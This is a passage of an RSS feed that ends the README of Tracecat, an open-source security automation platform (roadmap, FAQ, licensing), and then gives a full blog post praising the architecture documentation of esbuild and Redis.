<p dir="auto"><h2 tabindex="-1" dir="auto">Integrations and pre-built workflows</h2><a id="user-content-integrations-and-pre-built-workflows" aria-label="Permalink: Integrations and pre-built workflows" href="#integrations-and-pre-built-workflows"></a></p>
<p dir="auto">We are working hard to reach core feature parity with Tines. Integrations and out-of-the-box automations will be prioritized according to user feedback. If you've got any suggestions, please let us know on <a href="https://discord.gg/n3GF4qxFU8" rel="nofollow">Discord</a> 🦾.</p>
<p dir="auto">Here are a few integrations on our roadmap:</p>
<ul>
<li> Slack</li>
<li> Microsoft Teams</li>
<li> GitHub</li>
<li> CrowdStrike</li>
<li> Terraform</li>
<li> AWS CloudTrail</li>
<li> Vanta</li>
</ul>
<p dir="auto"><h2 tabindex="-1" dir="auto">Security</h2><a id="user-content-security" aria-label="Permalink: Security" href="#security"></a></p>
<p dir="auto">Looking to report a security vulnerability? Please don't post about it in GitHub issue. Instead, refer to our <a href="https://github.com/TracecatHQ/tracecat/blob/main/SECURITY.md">SECURITY.md</a> file.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">FAQ</h2><a id="user-content-faq" aria-label="Permalink: FAQ" href="#faq"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">What does it mean to be "practitioner-obsessed"?</h3><a id="user-content-what-does-it-mean-to-be-practitioner-obsessed" aria-label="Permalink: What does it mean to be &quot;practitioner-obsessed&quot;?" href="#what-does-it-mean-to-be-practitioner-obsessed"></a></p>
<p dir="auto">Core features, user-interfaces, and day-to-day workflows are based on existing best-practices from <a href="https://medium.com/brexeng/elevating-security-alert-management-using-automation-828004ad596c" rel="nofollow">best-in-class security teams</a>. We won't throw in a Clippy chatbot just for the sake of it.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Does the world really need another SOAR?</h3><a id="user-content-does-the-world-really-need-another-soar" aria-label="Permalink: Does the world really need another SOAR?" href="#does-the-world-really-need-another-soar"></a></p>
<ul dir="auto">
<li>Big enterprise SOARs are too expensive. They also lack transparency regarding their AI features.</li>
<li>Open source SOARs were popular two years ago, but failed to mature from side-projects into enterprise-ready software.</li>
<li>Most SIEMs are bundled with a SOAR, but lack flexibility for security teams (e.g. MSSPs) that work across multiple SIEMs or no SIEM at all.</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">Why build open source?</h3><a id="user-content-why-build-open-source" aria-label="Permalink: Why build open source?" href="#why-build-open-source"></a></p>
<ul dir="auto">
<li>We love using and building open source tools.</li>
<li>Existing "AI" security products hide behind demo-ware, sales calls, and white papers. We want to build in the open: open community, open tutorials, and open vision.</li>
<li>Create a safe space for practitioners to experiment with open source AI models in their own isolated environments.</li>
</ul>
<p dir="auto"><h3 tabindex="-1" dir="auto">What does AI-native mean?</h3><a id="user-content-what-does-ai-native-mean" aria-label="Permalink: What does AI-native mean?" href="#what-does-ai-native-mean"></a></p>
<p dir="auto">We believe the most useful AI is "boring AI" (e.g. summarization, semantic search, data enrichment, labelling) that integrates with existing workflows, but with modern UI/UX and robust data engineering.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Contributing</h2><a id="user-content-contributing" aria-label="Permalink: Contributing" href="#contributing"></a></p>
<p dir="auto">Whether it's big or small, we love contributions.
There's plenty of opportunity for new integrations and bug fixes.
The best way to get started is to ping us on <a href="https://discord.gg/n3GF4qxFU8" rel="nofollow">Discord</a>!</p>






<p dir="auto"><h2 tabindex="-1" dir="auto">Open source vs paid</h2><a id="user-content-open-source-vs-paid" aria-label="Permalink: Open source vs paid" href="#open-source-vs-paid"></a></p>
<p dir="auto">The Tracecat codebase is 100% open source under Apache-2.0. This includes (soon-to-be-built) enterprise features such as SSO and multi-tenancy. We offer a paid Cloud version for small-to-mid sized teams. Moreover, we plan to charge service fees to enterprises that want to deploy and maintain a self-hosted distributed version of Tracecat.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">License</h2><a id="user-content-license" aria-label="Permalink: License" href="#license"></a></p>
<p dir="auto"><a href="https://github.com/TracecatHQ/tracecat/blob/main/LICENSE">Apache-2.0</a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Two open source projects with great architecture documentation (320 pts)]]></title>
            <link>https://johnjago.com/great-docs/</link>
            <guid>39819409</guid>
            <pubDate>Mon, 25 Mar 2024 17:58:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://johnjago.com/great-docs/">https://johnjago.com/great-docs/</a>, See on <a href="https://news.ycombinator.com/item?id=39819409">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
		<article id="content">
			<p><a href="#esbuild">esbuild</a> and <a href="#redis">Redis</a><sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> are two examples of codebases with exceptional documentation.</p>
<p>Through their READMEs, changelogs, architecture documents, and code comments, both projects explain their design in such a way that someone new to the codebase can understand where things are, how things are done, and why they are done that way.</p>
<p>If you’re a developer looking to get better at documenting your code and software architecture, these are great case studies.</p>
<h2 id="why-good-documentation-matters">Why good documentation matters</h2>
<p>If you’re writing software, good documentation is a necessity, especially if other people will see or contribute to the codebase—or if you <em>yourself</em> plan on coming back later.</p>
<p>If you’re only using the software, you almost always could benefit from documentation that is missing, whether it be instructions on how to use it—or an explanation of when you should <em>and shouldn’t</em> use it.</p>
<p>If you’re contributing to a codebase, the speed at which you can start effectively contributing is correlated to how good the documentation is, as long as the code itself isn’t convoluted.</p>
<p>Whether you’re an author, contributor, or just an end user of the codebase, the quality of the documentation affects your experience, directly or indirectly—so writing good documentation matters.</p>
<p>The benefits of good documentation are too many to list. Here are a few that might apply to you.</p>
<ul>
<li>You save time, especially if you’re working with a team. Instead of explaining the entire codebase for an hour to each person who joins your project, though that is beneficial itself in a number of ways, they rather read the documentation ahead of time, resulting in a more productive discussion when you do talk, as it’s not a one-sided conversation.</li>
<li>Your open source project is more likely to receive outside contributions and therefore keep existing after you can no longer maintain it.</li>
<li>Past decisions that you’re now questioning have been recorded, preventing you from accidentally reintroducing a problem that a past decision helped to resolve.</li>
<li>More people can use your application or library, because fewer people have to figure things out for themselves.</li>
<li>It helps structure your thinking—and reveal flaws. When writing, you have to explicitly consider and record what you’re thinking, and it brings to light potential problems that you otherwise wouldn’t have noticed.</li>
</ul>
<p>With this in mind, let’s look at and learn from two open source projects that have excellent documentation.</p>
<h2 id="esbuild">esbuild</h2>
<p><a href="https://github.com/evanw/esbuild">esbuild</a> is a JavaScript bundler created by <a href="https://madebyevan.com/">Evan Wallace</a>. It’s not important for this analysis to know what a bundler is, but <a href="https://webpack.js.org/concepts/why-webpack/">webpack</a> has a good explanation if you’re curious.</p>
<h3 id="esbuilds-readme">esbuild’s README</h3>
<p>A project’s README serves as the entry point for a reader of the code. It’s where they get oriented, so it’s important to not overwhelm them with information. Likewise, it’s important to point them to different areas where they can learn more.</p>
<p><img src="https://johnjago.com/great-docs/esbuild-readme.png" alt="The short README for esbuild, with a logo, links, and a brief explanation of why someone would choose it over other bundlers."></p>
<p>This README focuses exclusively on the end user of the tool.</p>
<p>It first links to major sections in the documentation, such as the getting started section, allowing someone to jump to the topic they’re looking for.</p>
<p>The only other section is titled “Why?” and explains briefly why someone would choose this JavaScript bundler over others, with a visualization to help understand the reason. This section also lists the features of the tool, providing an overview of what it does, which helps someone determine if it meets their needs.</p>
<p>And that’s it. Starting from here, someone can explore the FAQ, the getting started pages if they wish to use it, the API documentation, or the documentation for a specific feature. It’s hard to get lost.</p>
<h3 id="esbuilds-architecture-documentation">esbuild’s architecture documentation</h3>
<p>Although the README doesn’t mention the code architecture—its audience is the end user—esbuild is certainly not lacking in architecture documentation.</p>
<p>Inside a directory called <code>docs</code> are two files: <code>architecture.md</code> and <code>development.md</code>. It’s easy to find what you’re looking for. We’ll focus on the first file.</p>
<p>The document starts with a table of contents to help find things and an introduction which explains the intention of the document.</p>
<p><img src="https://johnjago.com/great-docs/esbuild-architecture-introduction.png" alt="The table of contents and introductory paragraph of the esbuild architecture documentation."></p>
<p>After the short introduction, it talks about the design principles. This is important because it sets the foundation for the decisions that follow. For anything not explicitly explained in the later parts, we wouldn’t be wrong to assume they are a result of these principles, and can infer the reason for an unexplained design choice.</p>
<p><img src="https://johnjago.com/great-docs/esbuild-architecture-design.png" alt="The design principles of the architecture of esbuild."></p>
<p>Another thing done well is that it’s not all text. There are plenty of graphics to help explain concepts. Below, we see a graphic which shows the different phases of how esbuild bundles JavaScript, including an indication of which steps are done in parallel.</p>
<p>Graphs with nodes and edges are useful if the process you’re explaining involves steps that loop back to each other, which can be hard to get across by textual description alone.</p>
<p><img src="https://johnjago.com/great-docs/esbuild-architecture-build-pipeline.png" alt="A graphic in the esbuild architecture documentation that explains the different phases of how it bundles JavaScript, including an indication of which steps are done in parallel."></p>
<p>The visuals mix in code as well, such as in the below example which shows the traversal of the program through code during the tree shaking process.</p>
<p><img src="https://johnjago.com/great-docs/esbuild-architecture-tree-shaking.png" alt="The section on tree shaking in the esbuild architecture documentation, with a graphic to aid in visualizing a complex concept."></p>
<p>The rest of the architecture documentation for esbuild is similar. It explains a lot in text, but also provides graphics to help visualize complex concepts. Code snippets, tables, and formatting are abundant to aid in reading and understanding how and why things work the way they do.</p>
<h3 id="esbuilds-changelog">esbuild’s changelog</h3>
<p>esbuild’s thorough documentation doesn’t stop at the architecture—it extends to the changelog as well.</p>
<p>This entry in the changelog has a summary, an extended description, and example code showing the output before and after the change.</p>
<p><img src="https://johnjago.com/great-docs/esbuild-changelog.png" alt="An entry in the esbuild changelog with a summary, an extended description, and example code with before and after the change."></p>
<p>What’s impressive is that <em>every</em> entry is like this. Detailed explanation<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>, example code. Someone reading through the changes can understand the impact without referencing the actual code modifications.</p>
<h3 id="the-result-of-esbuilds-good-documentation">The result of esbuild’s good documentation</h3>
<p>It’s not enough that esbuild is a fast JavaScript bundler to win people over. The detailed documentation has no doubt played a role in its growth. At the time of writing, it has 37,000 stars on GitHub and is used by 4.6 million projects.</p>
<p>Although Evan is the main contributor by far, there is still no doubt that the documentation has helped get the project to where it is today by serving as a form of thinking—it may be the only way to wrangle such a complex system into one’s head.</p>
<h2 id="redis">Redis</h2>
<p><a href="https://github.com/redis/redis">Redis</a> is an in-memory database. As with esbuild, any more explanation of what Redis does is out of scope for this post, but what is in scope for Redis is the level of detail in the documentation, specifically around its code and architecture.</p>
<h3 id="the-redis-readme-introduction-and-architecture">The Redis README: Introduction and architecture</h3>
<p>The <a href="https://github.com/redis/redis/blob/unstable/README.md">README</a> shares many of the good characteristics of the esbuild README, with a couple differences.</p>
<p>First, it’s not short, but that’s okay because the section that introduces Redis is short. The rest of the README is for people contributing to or reading the Redis codebase. This README has a focus on both end users and contributors. For esbuild and Redis, what’s important is that the documentation for both end users and contributors is available—it’s just in different locations.</p>
<p>In the section for contributors, the Redis README talks about compiling the Redis source code, fixing common build problems, gotchas with particular operating systems, and running and installing Redis. It covers the basics and highlights common problems, allowing someone to get started and assisting them in not getting stuck soon after.</p>
<p>However, the section which really shines is about the <a href="https://github.com/redis/redis/blob/unstable/README.md#redis-internals">Redis internals</a>.</p>
<p>This section begins with the layout of the source code, allowing someone new to understand where to find what they’re looking for, and what directories they might be working in most.</p>
<p><img src="https://johnjago.com/great-docs/redis-source-code-layout.png" alt="A section in the Redis README that talks about the layout of the source code."></p>
<p>Then, it talks about key files and their structure. This helps someone understand where the control flow starts.</p>
<p>Further down it continues to go over key files, building up an architecture of the program.</p>
<p><img src="https://johnjago.com/great-docs/redis-server-h.png" alt="A section in the Redis README that explains the server.h file, which is the main header file where its data structures are defined."></p>
<p>Unlike esbuild, the description of the architecture is more compact, yet it’s still wonderful to have, as the other option is to read through hundreds of source code files, some with thousands of lines.</p>

<p>Any well-documented codebase usually has good inline documentation in the form of code comments.</p>
<p>In the Redis codebase, we see examples like the one below, where multiple paragraphs explain a single line of code, providing valuable context.</p>
<p><img src="https://johnjago.com/great-docs/redis-detailed-code-comment.png" alt="An example of a detailed code comment in the Redis source code, with a paragraph explaining a single line to provide full context."></p>
<p>It’s important to emphasize that long explanations of trivial lines of code are not necessary. If the operation is simple and doesn’t require additional context to understand why it’s done that way, then it’s better to have no comment. A comment which says the same thing as the line of code is unnecessary, unless the line of code is particularly difficult to read (in which case it should probably be refactored), or the intention is to teach.</p>
<p>Below we see an example of this, where the line that may be questioned with “why the assertion?” is explained with a comment which assures the reader why it should be correct to assert this.</p>
<p><img src="https://johnjago.com/great-docs/redis-necessary-code-comment.png" alt="A function in the Redis source code where it makes an assertion that might be questioned. The line with the assertion has a comment explaining why the assertion should be correct."></p>
<h2 id="wrapping-up">Wrapping up</h2>
<p>There are many open source projects with great documentation. I decided to showcase these two because I vividly remember that when I first came across them, I thought to myself, “wow, this is some good documentation.”</p>
<p>Although time constraints in the moment may not allow for such thorough documentation, what’s hard to see is how much time it saves later on, not just for yourself but for others. Keep that in mind when making the tradeoff.</p>
<p>Some projects are purely for fun, or something that only you are working on and you’re not sure if it’s going to go anywhere. In these situations, it’s okay to not document anything.</p>
<p>But not documenting anything on a project that many people use or contribute to is something you may want to reconsider.</p>


		</article>
	</div></div>]]></description>
        </item>
    </channel>
</rss>